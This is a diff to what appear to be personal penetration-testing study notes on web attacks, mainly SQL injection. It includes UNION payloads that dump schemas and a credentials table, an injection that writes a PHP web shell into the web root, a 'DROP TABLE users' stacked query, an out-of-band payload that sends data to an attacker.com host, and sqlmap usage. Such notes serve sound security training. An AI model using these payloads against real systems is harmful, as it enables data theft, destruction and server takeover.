@@ -1,4 +1,3 @@
-
 ## SQL Injection (SQLi)
 *Lots of webpages store data in SQL databases. If they don't sanitize user inputs, then it is possible to query the database from an input field *
 
@@ -53,7 +52,10 @@ As for `Time Based` SQL injections, we use SQL conditional statements that delay
 These are SQL injections that when executed, show no obvious clue to the user
 
 **Cookies**
-Try using SQLi in BurpSuite on these fields to see if the field is inject-able. 
+Try using SQLi in BurpSuite on these fields to see if the field is inject-able. Also note that you may not have to use a quote to escape a string, as integer cookies are integers and not strings. This will depend on the cookie type, so just be aware of the variable type.
+![[../../Pasted image 20250515193009.png]]
+![[../../Pasted image 20250515193029.png]]
+
 
 **SQL-Map**
 Save a HTTP Post request with the query as a .txt
@@ -92,6 +94,9 @@ ds'UNION SELECT 1, user(), 3, 4 -- -
 
 You can enumerate database info like this 
 ```sql
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+```sql
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
 ```sql
@@ -124,17 +129,64 @@ In a SQLi it may look more like
 ```sql
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
+**SQLMAP**
+This tool supports all types of SQLi
+- `B`: Boolean-based blind
+	- `AND 1=1`
+- `E`: Error-based
+	- `AND GTID_SUBSET(@@version,0)`
+- `U`: Union query-based
+	- `UNION ALL SELECT 1,@@version,3`
+- `S`: Stacked queries
+	- `; DROP TABLE users`
+- `T`: Time-based blind
+	- `AND 1=IF(2>1,SLEEP(5),0)`
+- `Q`: Inline queries
+	- `SELECT (SELECT @@version) from`
+Also, Out-of-Band Injects look like this`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
+
+![[../../Pasted image 20250515150317.png]]
+Then just swap ~~~curl~~~ for sqlmap
+
+To dump a table use the `-dump` flag
+Use the `--parse-errors` to debug
+Use `-t /tmp/traffic.txt` to write output to a file
+Use `-v <n>` to specify verbosity level
+Use --proxy to send traffic through a proxy like Burp
+
+Sometimes you need to specify specific characters for the inject. This can be done like this.
+```
+--prefix="%'))" 
+#or
+--suffix="-- -"
+```
+
+
+
+
+
+
+
+
 ![[../../cheatsheet-sql-injection-fundamentals.pdf]]
 
+![[../../Sqlmap_Essentials_Module_Cheat_Sheet.pdf]]
 
 ---
-
 ## Cross Site Scripting (XSS)
+**DOM**
+**Stored**
+**Reflected**
+**Discovery**
+**Phishing**
+**Hijacking**
+
 
 ---
 ## Command Injection
+**Blind**
+**Out-of-Band**
 
----
 ## Insecure File Upload
 *Sometimes there are weak restrictions on file uploads*
 
@@ -164,9 +216,11 @@ At the top of a file is metadata. You can see this metadata when you cat the fil
 
 
 ---
+
 ## AUTHN Attacks
 
 ---
+
 ## External Entities Injection (XXE)
 
 ---
